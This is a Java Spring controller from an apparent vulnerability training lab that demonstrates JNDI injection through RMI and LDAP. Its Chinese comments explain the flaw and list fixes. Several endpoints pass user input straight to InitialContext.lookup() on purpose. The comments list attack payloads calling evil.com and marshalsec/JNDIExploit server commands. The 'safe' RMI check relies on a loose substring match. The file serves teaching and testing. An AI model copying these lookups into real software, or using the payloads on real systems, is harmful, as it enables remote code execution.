package com.vulnlab.controller;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import org.springframework.web.bind.annotation.*;

/**
 * JNDI 注入漏洞演示
 *
 * 漏洞说明：
 * - JNDI (Java Naming and Directory Interface) 注入是 Java 应用中的高危漏洞
 * - 攻击者可通过 JNDI RMI/LDAP 协议远程加载恶意类并执行
 * - Log4Shell、Fastjson、许多反序列化漏洞都依赖 JNDI 注入
 *
 * 漏洞原理：
 * 1. 应用使用用户输入构造 JNDI 查询
 * 2. InitialContext.lookup() 方法支持多种协议
 * 3. 攻持的协议：RMI、LDAP、DNS、IIOP 等
 * 4. 远程服务器返回 Reference 对象，触发本地 class 加载
 * 5. 可加载远程恶意类并执行任意代码
 *
 * 常见攻击向量：
 * - ${jndi:rmi://evil.com:1099/Exploit}
 * - ${jndi:ldap://evil.com:1389/Exploit}
 * - rmi://evil.com:1099/Exploit
 * - ldap://evil.com:1389/Exploit
 *
 * 修复方案：
 * 1. 禁止使用用户输入构造 JNDI 查询
 * 2. 使用白名单验证 JNDI URL
 * 3. 限制 JNDI 协议为必要的安全协议
 * 4. 升级 Java 版本（JDK 6u132、7u122、8u113 后增加了 LDAP/RMI 限制）
 * 5. 设置系统属性禁止远程类加载：
 *    - com.sun.jndi.rmi.object.trustURLCodebase=false
 *    - com.sun.jndi.ldap.object.trustURLCodebase=false
 *
 * @author VulnLab
 */
@RestController
@RequestMapping("/jndi")
public class JNDIController {

    /**
     * JNDI RMI 注入漏洞 - 基础测试
     *
     * 漏洞代码：直接使用用户输入进行 JNDI RMI 查询
     *
     * 测试环境搭建：
     * 1. 使用 JNDIExploit: java -jar JNDIExploit.jar -i 0.0.0.0 -p 8888
     * 2. 使用 marshalsec:
     *    - java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#Exploit" 1099
     *
     * 测试用例：
     * - http://localhost:8080/jndi/rmi/vuln?url=rmi://evil.com:1099/Exploit
     * - http://localhost:8080/jndi/rmi/vuln?url=rmi://192.168.1.100:1099/Exploit
     *
     * @param url RMI URL
     * @return 查询结果
     */
    @GetMapping("/rmi/vuln")
    public String rmiVuln(@RequestParam("url") String url) {
        try {
            // 漏洞代码：直接使用用户输入进行 JNDI 查询
            Context ctx = new InitialContext();
            Object lookup = ctx.lookup(url);
            return "RMI lookup result: " + lookup;
        } catch (NamingException e) {
            return "RMI lookup failed: " + e.getMessage();
        }
    }

    /**
     * JNDI RMI 注入漏洞 - 动态类加载场景
     *
     * 场景：应用动态加载远程配置对象
     *
     * 测试用例：
     * - http://localhost:8080/jndi/rmi/config?config=rmi://evil.com:1099/Exploit
     *
     * @param config 配置对象的 JNDI URL
     * @return 配置加载结果
     */
    @GetMapping("/rmi/config")
    public String rmiConfig(@RequestParam("config") String config) {
        try {
            // 漏洞代码：从远程加载配置对象
            Context ctx = new InitialContext();
            Object remoteConfig = ctx.lookup(config);
            return "Config loaded from: " + config + ", value: " + remoteConfig;
        } catch (NamingException e) {
            return "Failed to load config: " + e.getMessage();
        }
    }

    /**
     * JNDI RMI 注入漏洞 - 数据源场景
     *
     * 场景：通过 JNDI 查找数据源
     *
     * 测试用例：
     * - 正常: http://localhost:8080/jndi/rmi/datasource?name=rmi://localhost:1099/DataSource
     * - 攻击: http://localhost:8080/jndi/rmi/datasource?name=rmi://evil.com:1099/Exploit
     *
     * @param name 数据源 JNDI 名称
     * @return 查找结果
     */
    @GetMapping("/rmi/datasource")
    public String rmiDataSource(@RequestParam("name") String name) {
        try {
            // 漏洞代码：使用用户输入查找数据源
            Context ctx = new InitialContext();
            Object ds = ctx.lookup(name);
            return "DataSource found: " + ds;
        } catch (NamingException e) {
            return "DataSource not found: " + e.getMessage();
        }
    }

    /**
     * JNDI LDAP 注入漏洞 - 基础测试
     *
     * 漏洞代码：直接使用用户输入进行 JNDI LDAP 查询
     *
     * 测试环境搭建：
     * 1. 使用 JNDIExploit: java -jar JNDIExploit.jar -i 0.0.0.0 -p 8888
     * 2. 使用 marshalsec:
     *    - java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://evil.com/#Exploit" 1389
     *
     * 测试用例：
     * - http://localhost:8080/jndi/ldap/vuln?url=ldap://evil.com:1389/Exploit
     * - http://localhost:8080/jndi/ldap/vuln?url=ldap://192.168.1.100:1389/Exploit
     *
     * @param url LDAP URL
     * @return 查询结果
     */
    @GetMapping("/ldap/vuln")
    public String ldapVuln(@RequestParam("url") String url) {
        try {
            // 漏洞代码：直接使用用户输入进行 JNDI 查询
            Context ctx = new InitialContext();
            Object lookup = ctx.lookup(url);
            return "LDAP lookup result: " + lookup;
        } catch (NamingException e) {
            return "LDAP lookup failed: " + e.getMessage();
        }
    }

    /**
     * JNDI LDAP 注入漏洞 - 用户认证场景
     *
     * 场景：通过 LDAP 验证用户身份
     *
     * 测试用例：
     * - http://localhost:8080/jndi/ldap/auth?userDN=ldap://evil.com:1389/Exploit
     *
     * @param userDN 用户 DN
     * @return 认证结果
     */
    @GetMapping("/ldap/auth")
    public String ldapAuth(@RequestParam("userDN") String userDN) {
        try {
            // 漏洞代码：使用用户输入查找用户
            Context ctx = new InitialContext();
            Object user = ctx.lookup(userDN);
            return "User authenticated: " + user;
        } catch (NamingException e) {
            return "Authentication failed: " + e.getMessage();
        }
    }

    /**
     * JNDI LDAP 注入漏洞 - 服务发现场景
     *
     * 场景：通过 LDAP 发现微服务
     *
     * 测试用例：
     * - 攻击: http://localhost:8080/jndi/ldap/discover?service=ldap://evil.com:1389/Exploit
     *
     * @param service 服务 JNDI URL
     * @return 服务信息
     */
    @GetMapping("/ldap/discover")
    public String ldapDiscover(@RequestParam("service") String service) {
        try {
            // 漏洞代码：动态发现服务
            Context ctx = new InitialContext();
            Object svc = ctx.lookup(service);
            return "Service discovered: " + svc;
        } catch (NamingException e) {
            return "Service discovery failed: " + e.getMessage();
        }
    }

    /**
     * 安全版本 - RMI 查询（白名单验证）
     *
     * 修复方案：使用白名单验证 JNDI URL
     *
     * @param url RMI URL
     * @return 查询结果
     */
    @GetMapping("/rmi/safe")
    public String rmiSafe(@RequestParam("url") String url) {
        // 白名单：只允许特定的 RMI 服务器
        String[] allowedHosts = {"localhost", "127.0.0.1"};

        try {
            // 验证 URL 是否在白名单中
            boolean allowed = false;
            for (String host : allowedHosts) {
                if (url.contains("://" + host + ":") || url.contains("://" + host + "/")) {
                    allowed = true;
                    break;
                }
            }

            if (!allowed) {
                return "Access denied: URL not in whitelist";
            }

            Context ctx = new InitialContext();
            Object lookup = ctx.lookup(url);
            return "RMI lookup result: " + lookup;
        } catch (NamingException e) {
            return "RMI lookup failed: " + e.getMessage();
        }
    }

    /**
     * 安全版本 - LDAP 查询（协议限制）
     *
     * 修复方案：禁用远程代码加载
     *
     * @param url LDAP URL
     * @return 查询结果
     */
    @GetMapping("/ldap/safe")
    public String ldapSafe(@RequestParam("url") String url) {
        try {
            // 设置系统属性禁止远程类加载
            System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");

            // 验证 URL 格式
            if (!url.startsWith("ldap://localhost:") && !url.startsWith("ldap://127.0.0.1:")) {
                return "Access denied: Only localhost LDAP servers are allowed";
            }

            Context ctx = new InitialContext();
            Object lookup = ctx.lookup(url);
            return "LDAP lookup result: " + lookup;
        } catch (NamingException e) {
            return "LDAP lookup failed: " + e.getMessage();
        }
    }

    /**
     * 安全检查 - 显示 JNDI 环境信息
     *
     * @return 环境信息
     */
    @GetMapping("/info")
    public String info() {
        return String.format(
            "JNDI Injection Vulnerability Demo%n" +
            "====================================%n" +
            "Java Version: %s%n" +
            "OS: %s %s%n" +
            "%n" +
            "Vulnerability Endpoints:%n" +
            "- RMI: /jndi/rmi/vuln?url=rmi://evil.com:1099/Exploit%n" +
            "- LDAP: /jndi/ldap/vuln?url=ldap://evil.com:1389/Exploit%n" +
            "%n" +
            "Setup JNDI Server:%n" +
            "1. Download JNDIExploit: https://github.com/WhiteHSBG/JNDIExploit%n" +
            "2. Run: java -jar JNDIExploit.jar -i 0.0.0.0 -p 8888%n" +
            "3. Or use marshalsec for RMI/LDAP reference server",
            System.getProperty("java.version"),
            System.getProperty("os.name"),
            System.getProperty("os.version")
        );
    }
}
